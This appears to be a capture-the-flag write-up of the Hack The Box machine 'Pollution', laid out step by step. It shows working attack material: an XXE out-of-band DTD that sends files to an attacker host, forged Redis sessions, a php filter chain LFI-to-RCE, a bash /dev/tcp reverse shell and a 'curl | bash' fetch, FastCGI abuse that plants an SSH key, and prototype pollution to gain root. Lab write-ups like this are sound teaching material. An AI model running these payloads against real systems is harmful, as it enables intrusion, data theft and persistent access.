---
layout: single
title: Pollution - Hack The Box
date: 2023-06-30
excerpt: "Pollution is a hardbox from hackthebox. Where in doing penetration testing we can find information in the form of text files and this information is encrypted using base64. the contents of the file contains the token of the administrator. the system has XXE vulnerability, where we can get the /etc/passwd file using Out-of-Band technique. to get access rights to the system we can use php-filter-chain. to get user victor, we can exploit it using php-fpm or fastcgi. The root user can be found by using the vulnerability of the pollution prototype at address 127.0.0.1 using port 3000 or pollution api. Before that we can add a user with the admin role so that the exploitation can run smoothly."
header:
  teaser: /assets/img/pollution/Pollution.png
  teaser_home_page: true
  icon: /assets/htb.png
categories:
  - hackthebox
  - infosec
tag:
    - Linux
    - Prototype Pollution
    - Fastcgi
    - php-fpm
    - Path Traversal
    - RCE
    - Redis
    - Session Handler
toc: true
toc_sticky: true
---
![](/assets/img/pollution/Pollution.png)

## Synopsis

Pollution is a hardbox from hackthebox. Where in doing penetration testing we can find information in the form of text files and this information is encrypted using base64. the contents of the file contains the token of the administrator. the system has XXE vulnerability, where we can get the /etc/passwd file using Out-of-Band technique. to get access rights to the system we can use php-filter-chain. to get user victor, we can exploit it using php-fpm or fastcgi. The root user can be found by using the vulnerability of the pollution prototype at address 127.0.0.1 using port 3000 or pollution api. Before that we can add a user with the admin role so that the exploitation can run smoothly.

## Ports

```bash
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)
| ssh-hostkey:
|   3072 db:1d:5c:65:72:9b:c6:43:30:a5:2b:a0:f0:1a:d5:fc (RSA)
|   256 4f:79:56:c5:bf:20:f9:f1:4b:92:38:ed:ce:fa:ac:78 (ECDSA)
|_  256 df:47:55:4f:4a:d1:78:a8:9d:cd:f8:a0:2f:c0:fc:a9 (ED25519)
80/tcp   open  http    Apache httpd 2.4.54 ((Debian))
|_http-title: Home
| http-cookie-flags:
|   /:
|     PHPSESSID:
|_      httponly flag not set
6379/tcp open  redis   Redis key-value store
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

## HTTP

Before going deep enumeration, i just collect a simple information with `whatweb` tools. And you can see if we can collect  **collect.htb** as domain.

```bash
➜  pollution whatweb $target -a 3 -v
WhatWeb report for http://10.10.11.192
Status    : 200 OK
Title     : Home
IP        : 10.10.11.192
Country   : RESERVED, ZZ

Summary   : Apache[2.4.54], Bootstrap, Cookies[PHPSESSID], Email[info@collect.htb], HTML5, HTTPServer[Debian Linux][Apache/2.4.54 (Debian)], JQuery[2.1.0], Lightbox, Script
```

we can register in this box, then you can logged in. But in this time i dont able to collect much information.

![](/assets/img/pollution/1.png)

doing fuzzing for subdomain with seclist will given you **developers** and **forums** as a subdomain, added to `/etc/hosts` file.

```bash
➜  pollution ffuf -u http://collect.htb/ -H "Host: FUZZ.collect.htb" -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt -fw 11803 -mc all

        /'___\  /'___\           /'___\
       /\ \__/ /\ \__/  __  __  /\ \__/
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
         \ \_\   \ \_\  \ \____/  \ \_\
          \/_/    \/_/   \/___/    \/_/

       v1.5.0 Kali Exclusive <3
________________________________________________

 :: Method           : GET
 :: URL              : http://collect.htb/
 :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt
 :: Header           : Host: FUZZ.collect.htb
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: all
 :: Filter           : Response words: 11803
________________________________________________

forum                   [Status: 200, Size: 14098, Words: 910, Lines: 337, Duration: 420ms]
developers              [Status: 401, Size: 469, Words: 42, Lines: 15, Duration: 429ms]
```

if we tried to access the `developers.collect.htb`, you will be asked for password. in this time im gonna move into `forum.collect.htb`.

### Forum Pages
we can register first, and logged in with that credentials. We can found downloaded file in comment section.

![](/assets/img/pollution/2.png)

get an information with base64 encoding like below:

```bash
<item>
    <time>Thu Sep 22 18:29:34 BRT 2022</time>
    <url><![CDATA[http://collect.htb/set/role/admin]]></url>
    <host ip="192.168.1.6">collect.htb</host>
    <port>80</port>
    <protocol>http</protocol>
    <method><![CDATA[POST]]></method>
    <path><![CDATA[/set/role/admin]]></path>
    <extension>null</extension>
    <request base64="true"><![CDATA[UE9TVCAvc2V0L3JvbGUvYWRtaW4gSFRUUC8xLjENCkhvc3Q6IGNvbGxlY3QuaHRiDQpVc2VyLUFnZW50OiBNb3ppbGxhLzUuMCAoV2luZG93cyBOVCAxMC4wOyBXaW42NDsgeDY0OyBydjoxMDQuMCkgR2Vja28vMjAxMDAxMDEgRmlyZWZveC8xMDQuMA0KQWNjZXB0OiB0ZXh0L2h0bWwsYXBwbGljYXRpb24veGh0bWwreG1sLGFwcGxpY2F0aW9uL3htbDtxPTAuOSxpbWFnZS9hdmlmLGltYWdlL3dlYnAsKi8qO3E9MC44DQpBY2NlcHQtTGFuZ3VhZ2U6IHB0LUJSLHB0O3E9MC44LGVuLVVTO3E9MC41LGVuO3E9MC4zDQpBY2NlcHQtRW5jb2Rpbmc6IGd6aXAsIGRlZmxhdGUNCkNvbm5lY3Rpb246IGNsb3NlDQpDb29raWU6IFBIUFNFU1NJRD1yOHFuZTIwaGlnMWszbGk2cHJnazkxdDMzag0KVXBncmFkZS1JbnNlY3VyZS1SZXF1ZXN0czogMQ0KQ29udGVudC1UeXBlOiBhcHBsaWNhdGlvbi94LXd3dy1mb3JtLXVybGVuY29kZWQNCkNvbnRlbnQtTGVuZ3RoOiAzOA0KDQp0b2tlbj1kZGFjNjJhMjgyNTQ1NjEwMDEyNzc3MjdjYjM5N2JhZg==]]></request>
    <status>302</status>
    <responselength>296</responselength>
    <mimetype></mimetype>
    <response base64="true">
```

decoding processing output will give you a **token**.

```bash
➜  pollution echo "UE9TVCAvc2V0L3JvbGUvYWRtaW4gSFRUUC8xLjENCkhvc3Q6IGNvbGxlY3QuaHRiDQpVc2VyLUFnZW50OiBNb3ppbGxhLzUuMCAoV2luZG93cyBOVCAxMC4wOyBXaW42NDsgeDY0OyBydjoxMDQuMCkgR2Vja28vMjAxMDAxMDEgRmlyZWZveC8xMDQuMA0KQWNjZXB0OiB0ZXh0L2h0bWwsYXBwbGljYXRpb24veGh0bWwreG1sLGFwcGxpY2F0aW9uL3htbDtxPTAuOSxpbWFnZS9hdmlmLGltYWdlL3dlYnAsKi8qO3E9MC44DQpBY2NlcHQtTGFuZ3VhZ2U6IHB0LUJSLHB0O3E9MC44LGVuLVVTO3E9MC41LGVuO3E9MC4zDQpBY2NlcHQtRW5jb2Rpbmc6IGd6aXAsIGRlZmxhdGUNCkNvbm5lY3Rpb246IGNsb3NlDQpDb29raWU6IFBIUFNFU1NJRD1yOHFuZTIwaGlnMWszbGk2cHJnazkxdDMzag0KVXBncmFkZS1JbnNlY3VyZS1SZXF1ZXN0czogMQ0KQ29udGVudC1UeXBlOiBhcHBsaWNhdGlvbi94LXd3dy1mb3JtLXVybGVuY29kZWQNCkNvbnRlbnQtTGVuZ3RoOiAzOA0KDQp0b2tlbj1kZGFjNjJhMjgyNTQ1NjEwMDEyNzc3MjdjYjM5N2JhZg==" | base64 -d
POST /set/role/admin HTTP/1.1
Host: collect.htb
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:104.0) Gecko/20100101 Firefox/104.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: pt-BR,pt;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
Connection: close
Cookie: PHPSESSID=r8qne20hig1k3li6prgk91t33j
Upgrade-Insecure-Requests: 1
Content-Type: application/x-www-form-urlencoded
Content-Length: 38

token=ddac62a28254561001277727cb397baf#
```

we can use that token to logged in as administrator using `curl` with following command:

```
curl --cookie "PHPSESSID=(your cookie here after login on collect.htb)" -d "token=ddac62a28254561001277727cb397baf" http://collect.htb/set/role/admin -v
```

from now we can accesing `/admin` on **collect.htb**.

![](/assets/img/pollution/3.png)

you will find a **Registration Form** in here, you can use burpsuite to see what happen in background process.

```xml
POST /api HTTP/1.1
Host: collect.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-type: application/x-www-form-urlencoded
Content-Length: 175
Origin: http://collect.htb
DNT: 1
Connection: close
Referer: http://collect.htb/admin
Cookie: PHPSESSID=p540pf1105e0u9jmq3todvcu12

manage_api=<?xml version="1.0" encoding="UTF-8"?><root><method>POST</method><uri>/auth/register</uri><user><username>tester</username><password>tester</password></user></root>
```

Interesting part is **XML** , i assume we can perfrom **XXE** injection. if you unfamiliar with it, you can learn about XXE in [Portswigger](https://www.google.com/url?sa=t&rct=j&q=&esrc=s&source=web&cd=&cad=rja&uact=8&ved=2ahUKEwjtqqLw8dz_AhVtzTgGHeqDDCQQFnoECBMQAQ&url=https%3A%2F%2Fportswigger.net%2Fweb-security%2Fxxe&usg=AOvVaw2KQ_ibZdrrs1h6T81GwQwT&opi=89978449) and it's free.

request on below i just check if we can detecting a blind **XXE** vulnerabillity via out-of-band.  Which mean the attacker allowed to exfiltrate sensitive data such as `/etc/passwd`, `/etc/hosts`, etc.

```bash
POST /api HTTP/1.1
Host: collect.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-type: application/x-www-form-urlencoded
Content-Length: 104
Origin: http://collect.htb
DNT: 1
Connection: close
Referer: http://collect.htb/admin
Cookie: PHPSESSID=p540pf1105e0u9jmq3todvcu12

manage_api=<!DOCTYPE+foo+[<!ENTITY+%25+xxe+SYSTEM+"http%3a//10.10.14.146/malicious.dtd">+%25xxe%3b]>


```

i combine with `netcat` first to see ifwe can get connection back from victim.

```bash
➜  pollution nc -lnvp 80
listening on [any] 80 ...
connect to [10.10.14.146] from (UNKNOWN) [10.10.11.192] 34814
GET /malicious.dtd HTTP/1.1
Host: 10.10.14.146
Connection: close
```

And now we able to create our **malicious.dtd**, in this time i want to collect information on `index.php` file. Malicious.dtd file contains:

```bash
#we able to use php-wrapper inside xxe
<!ENTITY % file SYSTEM ""php://filter/convert.base64-encode/resource=index.php"">
<!ENTITY % eval "<!ENTITY &#x25; exfiltrate SYSTEM 'http://10.10.14.146/?x=%file;'>">
%eval;
%exfiltrate;
```

click our request on burp again, and you will retrieve an information contains **index.php** file with base64 encoding.

```bash
➜  pollution python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.10.11.192 - - [24/Jun/2023 04:59:53] "GET /mal.dtd HTTP/1.1" 200 -
10.10.11.192 - - [24/Jun/2023 05:01:14] "GET /mal.dtd HTTP/1.1" 200 -
10.10.11.192 - - [24/Jun/2023 05:01:24] "GET /mal.dtd HTTP/1.1" 200 -
10.10.11.192 - - [24/Jun/2023 05:02:13] "GET /mal.dtd HTTP/1.1" 200 -
10.10.11.192 - - [24/Jun/2023 05:02:21] "GET /mal.dtd HTTP/1.1" 200 -
10.10.11.192 - - [24/Jun/2023 05:04:16] "GET /mal.dtd HTTP/1.1" 200 -
10.10.11.192 - - [24/Jun/2023 05:04:16] "GET /?x=PD9waHAKCnJlcXVpcmUgJy4uL2Jvb3RzdHJhcC5waHAnOwoKdXNlIGFwcFxjbGFzc2VzXFJvdXRlczsKdXNlIGFwcFxjbGFzc2VzXFVyaTsKCgokcm91dGVzID0gWwogICAgIi8iID0+ICJjb250cm9sbGVycy9pbmRleC5waHAiLAogICAgIi9sb2dpbiIgPT4gImNvbnRyb2xsZXJzL2xvZ2luLnBocCIsCiAgICAiL3JlZ2lzdGVyIiA9PiAiY29udHJvbGxlcnMvcmVnaXN0ZXIucGhwIiwKICAgICIvaG9tZSIgPT4gImNvbnRyb2xsZXJzL2hvbWUucGhwIiwKICAgICIvYWRtaW4iID0+ICJjb250cm9sbGVycy9hZG1pbi5waHAiLAogICAgIi9hcGkiID0+ICJjb250cm9sbGVycy9hcGkucGhwIiwKICAgICIvc2V0L3JvbGUvYWRtaW4iID0+ICJjb250cm9sbGVycy9zZXRfcm9sZV9hZG1pbi5waHAiLAogICAgIi9sb2dvdXQiID0+ICJjb250cm9sbGVycy9sb2dvdXQucGhwIgpdOwoKJHVyaSA9IFVyaTo6bG9hZCgpOwpyZXF1aXJlIFJvdXRlczo6bG9hZCgkdXJpLCAkcm91dGVzKTsK HTTP/1.1" 200 -
```

decoding process:

```php
<?php

require '../bootstrap.php';

use app\classes\Routes;
use app\classes\Uri;


$routes = [
    "/" => "controllers/index.php",
    "/login" => "controllers/login.php",
    "/register" => "controllers/register.php",
    "/home" => "controllers/home.php",
    "/admin" => "controllers/admin.php",
    "/api" => "controllers/api.php",
    "/set/role/admin" => "controllers/set_role_admin.php",
    "/logout" => "controllers/logout.php"
];

$uri = Uri::load();
require Routes::load($uri, $routes);
```

i was wondering about bootsrap.php, and we able to capture password for **Redis**.

```php
<?php
ini_set('session.save_handler','redis');
ini_set('session.save_path','tcp://127.0.0.1:6379/?auth=COLLECTR3D1SPASS');

session_start();
```

Since we know **developers.collect.htb** protected by a password. we can try gather information from **.htpasswd** file on folder `/var/www/developers/`.

```bash
➜  pollution echo "ZGV2ZWxvcGVyc19ncm91cDokYXByMSRNektBNXlYWSREd0V6Lmp4VzlVU1dvOC5nb0Q3alkxCg==" | base64 -d
developers_group:$apr1$MzKA5yXY$DwEz.jxW9USWo8.goD7jY1
```

 put them hash into `jhon` with following command:
 
```bash
john hash -w=/usr/share/wordlists/rockyou.txt
```

![](/assets/img/pollution/4.png)

use that credentials to accessing **developers.collect.htb** page.

![](/assets/img/pollution/5.png)

inside `/var/www/developers/index.php` file, we can determining if there is **LFI** to **RCE**.

```php
<?php
require './bootstrap.php';


if (!isset($_SESSION['auth']) or $_SESSION['auth'] != True) {
    die(header('Location: /login.php'));
}

if (!isset($_GET['page']) or empty($_GET['page'])) {
    die(header('Location: /?page=home'));
}

$view = 1;

?>

<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <script src="assets/js/tailwind.js"></script>
    <title>Developers Collect</title>
</head>

<body>
    <div class="flex flex-col h-screen justify-between">
        <?php include("header.php"); ?>
		#here's the RCE
        <main class="mb-auto mx-24">
            <?php include($_GET['page'] . ".php"); ?>
        </main>

        <?php include("footer.php"); ?>
    </div>

</body>
```

we cannot logged-in on **developers** site because we didnt any credentials yet, otherword we still has a **redis** on port 6379. Redis is a powerful and fast key-value storage service that can also be used as session handler for PHP system. Since we have session handler and redis is **open**, attacker can leverage their attack to manipulate the **session** to escalate they privilege.

```bash
➜  pollution redis-cli -h $target
#authentication process
10.10.11.192:6379> AUTH COLLECTR3D1SPASS
OK
#listing all keys
10.10.11.192:6379> keys *
1) "PHPREDIS_SESSION:j719s462i7unbkt7d8o8f5ecn8"

# set session handler command
set "PHPREDIS_SESSION:(your-cookie-after-access-login-page-from developers.collect.htb)" "username|s:1:\"a\";role|s:5:\"admin\";auth|s:4:\"True\";"

```

image below is my cookies with set on redis.

![](/assets/img/pollution/6.png)

you can reload the page and soon you will able to access the homepage.

![](/assets/img/pollution/7.png)

That i mentioned early, i read how to make **LFI** into **RCE** from [hacktricks](https://book.hacktricks.xyz/pentesting-web/file-inclusion/lfi2rce-via-php-filters). I was read about php filter chain, and you can grab the exploitation script generator in [here](https://github.com/synacktiv/php_filter_chain_generator) .

command for get `/etc/passwd` :

```bash
./php_filter_chain_generator.py --chain '<?= file_get_contents("/etc/passwd");?>'
```

put the output in burpsuite using parameter **page=** will given you an information what user inside system.

![](/assets/img/pollution/8.png)

from here i just make a payload with `curl` command to access our shell through web server.

shell.sh contains:

```bash
#!/bin/bash
bash -i >& /dev/tcp/10.10.14.48/9000 0>&1
```

generate php filter chain again, and make sure start the listener

```shell
./php_filter_chain_generator.py --chain '<?=`curl 10.10.14.48/shell | bash`?>'
```

![](/assets/img/pollution/9.png)

## Victor User

During the enumeration process, i able to found another credentials on `/var/www/html/collect` directory.

![](/assets/img/pollution/10.png)

mysql port 3306 is open on system, so we can access it.

```mysql
MariaDB [(none)]> show databases;
+--------------------+
| Database           |
+--------------------+
| developers         |
| forum              |
| information_schema |
| mysql              |
| performance_schema |
| pollution_api      |
| webapp             |
+--------------------+
7 rows in set (0.001 sec)

MariaDB [(none)]> use pollution_api
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Database changed
MariaDB [pollution_api]> show tables;
+-------------------------+
| Tables_in_pollution_api |
+-------------------------+
| messages                |
| users                   |
+-------------------------+
2 rows in set (0.000 sec)

MariaDB [pollution_api]> select * from users;
+----+----------+----------+------+---------------------+---------------------+
| id | username | password | role | createdAt           | updatedAt           |
+----+----------+----------+------+---------------------+---------------------+
|  1 | kadavul  | puli1234 | user | 2023-06-23 18:57:12 | 2023-06-23 18:57:12 |
|  2 | admin    | admin    | user | 2023-06-24 10:04:28 | 2023-06-24 10:04:28 |
+----+----------+----------+------+---------------------+---------------------+
2 rows in set (0.000 sec)
```

i leave this behind, because i get more information using **linpeas**.

```bash
#)You_can_write_even_more_files_inside_last_directory

/var/cache/apache2/mod_cache_disk
/var/lib/nginx/body
/var/lib/nginx/fastcgi
/var/lib/nginx/proxy
/var/lib/nginx/scgi
/var/lib/nginx/uwsgi
/var/lib/php/sessions
/var/tmp
```

Googling about **fast-cgi** will lead us into [hacktricks](https://book.hacktricks.xyz/network-services-pentesting/9000-pentesting-fastcgi), if you check on listening port inside system, you will notice if port **9000** is **open**. And look at the process in the background using `ps aux` command will telling us if **victor** user run **php-fpm** command. we can escalate into victor user using this exploitation [script](https://gist.githubusercontent.com/phith0n/9615e2420f31048f7e30f3937356cf75/raw/ffd7aa5b3a75ea903a0bb9cc106688da738722c5/fpm.py). 

upload **fpm.py** into system, and run command below to put your ssh-key into victor folder.

```python
python3 fpm.py -c "<?= system('echo ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDPHpTrjCTCSIYdZ6C8a8IYLQDnZKQuiFmdchyvsH6hY5WMLVtBzd6Xp6kVke9NRVwjMUI7diXVatvXkZcGhiiraH2ezbXmZ2cBQ0hbFkQa2F/rKi0vWu8tfmgElXS4uRZ3Lg7XnFhTv8og3WyztQMyuuR/tm6XJbz85c74W1v4ztE5Vz9YkAMgay1JROQCJBUkBTuC9czye5jhAvbO38j5j39wARKPzgJM6pImy+Nzr72N8aYCqgOrY8OYtBw4M1pk99Nr1Tk0YY3wyTLSP6Lt9KA38PPqvL5J8pB8MEQCR3SipvEx0L5LIyKG1s9n+AEGgvrW3s/IzOOF4EakyBP9lEdqlGnU5vxgPJy90FjpS0gVJZzX+vsl60KuuT1e13fy0SmwpMW3PQe/QOTPUM6bxDQzMZcJ25c3KrJuznz95NbYCjy2qX1G5CUJSl02VuqwlIdxpsNttARveCs9pZHPcp7Af6/OVk9hNY6kt8U6sZAFtR5HBbma22zyRg/u+zk= root@kali >> /home/victor/.ssh/authorized_keys'); ?>" 127.0.0.1 -p 9000 /tmp/test.php 
```

```bash
ssh -i id_rsa victor@10.10.11.192
```

![](/assets/img/pollution/11.png)

## Privilege Escalation 

check if we can interact with port **3000** using `curl` command: 

```json
victor@pollution:~/pollution_api$ curl 127.0.0.1:3000
{"Status":"Ok","Message":"Read documentation from api in /documentation"}

victor@pollution:~/pollution_api$ curl 127.0.0.1:3000/documentation
{"Documentation":{"Routes":{"/":{"Methods":"GET","Params":null},"/auth/register":{"Methods":"POST","Params":{"username":"username","password":"password"}},"/auth/login":{"Methods":"POST","Params":{"username":"username","password":"password"}},"/client":{"Methods":"GET","Params":null},"/admin/messages":{"Methods":"POST","Params":{"id":"messageid"}},"/admin/messages/send":{"Methods":"POST","Params":{"text":"message text"}}}}}
```

**interesting**, keep digging and find a pollution folder in /`home/victor` directory, this below is file for auth.js

```javascript
const express = require('express');
const User = require('../models/User');
const router = express.Router();
const { signtoken } = require('../functions/jwt')
const { exec } = require('child_process');

router.post('/register', async (req,res)=>{
    if(req.body.username != null && req.body.password != null){
        try{
            const find = await User.findAll({where: {username: req.body.username}})
            if(find.length == 0){

                User.create({
                    username: req.body.username,
                    password: req.body.password,
                    role: "user"
                });

                exec('/home/victor/pollution_api/log.sh log_register');

                return res.json({Status: "Ok"});

            }

            return res.json({Status: "This user already exists"});
        }catch(err){

            return res.json({Status: "Error"});
            

        }
    }

    return res.json({Status: "Parameters not found"});
})

router.post('/login', async (req,res)=>{
    if(req.body.username != null && req.body.password != null){
        try{
            const find = await User.findAll({where: {username: req.body.username, password: req.body.password}});
            if(find.length > 0){

                exec('/home/victor/pollution_api/log.sh log_login');

                const token = signtoken({user: find[0].username, is_auth: true, role: find[0].role});
                return res.json({
                    Status: "Ok",
                    Header: {
                        "x-access-token": token
                    }
                });

            }

            return res.json({Status: "Error", Message: "Invalid Credentials"});
        }catch(err){

            return res.json({Status: "Error"});
        }
    }

    return res.json({Status: "Parameters not found"});
})


module.exports = router;
```

file client.js

```javascript
#function messages
const express = require('express');
const router = express.Router();
const User = require('../models/User');
const { decodejwt } = require('../functions/jwt')


router.use('/', async(req,res,next)=>{
    if(req.headers["x-access-token"]){

        const token = decodejwt(req.headers["x-access-token"]);
        if(token){
            const find = await User.findAll({where: {username: token.user, role: token.role}});

            if(find.length > 0){

                if(find[0].username == token.user && find[0].role == token.role){

                    return next();

                }

                return res.json({Status: "Error", Message: "You are not allowed"});
            }

            return res.json({Status: "Error", Message: "You are not allowed"});
        }

        return res.json({Status: "Error", Message: "You are not allowed"});
    }

    return res.json({Status: "Error", Message: "You are not allowed"});
})


router.post('/',(req,res)=>{
    res.json({Status: "Ok", Message: 'This route is under development'});
})



module.exports = router;
```

im telling you if this script contains a **prototype pollution** vulnerabillity. you can read in this [article](https://www.sonarsource.com/blog/blitzjs-prototype-pollution/) and [hacktricks](https://book.hacktricks.xyz/pentesting-web/deserialization/nodejs-proto-prototype-pollution/prototype-pollution-to-rce) if you want to check the similiar code.

we can try access **prototype api** with credentials `admin:admin` that we found on mysql early.

```bash
curl http://127.0.0.1:3000/auth/login -H "Content-Type: application/json" -d '{"username": "admin", "password": "admin"}'
```

get the `x-access-token` headers with status ok, which is we use a valid credentials and we can tried to exploit them. 

```json
{"Status":"Ok","Header":{"x-access-token":"eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoiYWRtaW4iLCJpc19hdXRoIjp0cnVlLCJyb2xlIjoidXNlciIsImlhdCI6MTY4NzYzNzQ0MSwiZXhwIjoxNjg3NjQxMDQxfQ.sm9Kw2RbE2EwhMPxibKb1-tAXKBf15uc3PfkSf4ZbS4"}}
```

my exploit script like below

![](/assets/img/pollution/carbon.png)

But when i tried to run my exploit script, i retrieve an error messages several times. My exploit code focus on grab root.txt and given victor access to read that flag using `chown` command.

![](/assets/img/pollution/12.png)

i was thinking, might be we need to make our **user** with **admin** role. Because the admin user has a role as a user

access mysql again and added our user with following command:

```bash
insert into users values(123,"b666","password", "admin", "2019-04-19 15:40:10", "2019-10-17 20:20:20"); 
```

![](/assets/img/pollution/13.png)

and now when i tried to execute my exploit script again, magical things happen. 

![](/assets/img/pollution/14.png)

as you can see i able to grab root.txt, and i able to put my id_rsa into root folder too

![](/assets/img/pollution/15.png)


# Refferencess
```console
https://gist.github.com/mccabe615/b0907514d34b2de088c4996933ea1720
https://www.php.net/manual/en/function.print-r.php
https://book.hacktricks.xyz/network-services-pentesting/9000-pentesting-fastcgi
https://book.hacktricks.xyz/pentesting-web/deserialization/nodejs-proto-prototype-pollution/prototype-pollution-to-rce
https://book.hacktricks.xyz/pentesting-web/deserialization/nodejs-proto-prototype-pollution
https://gist.githubusercontent.com/phith0n/9615e2420f31048f7e30f3937356cf75/raw/ffd7aa5b3a75ea903a0bb9cc106688da738722c5/fpm.py
https://github.com/synacktiv/php_filter_chain_generator
https://book.hacktricks.xyz/pentesting-web/file-inclusion
https://book.hacktricks.xyz/pentesting-web/file-inclusion/lfi2rce-via-php-filters
https://www.sonarsource.com/blog/blitzjs-prototype-pollution/
https://exploit-notes.hdks.org/exploit/network/fastcgi-pentesting/
https://exploit-notes.hdks.org/exploit/web/security-risk/prototype-pollution-in-server-side/
```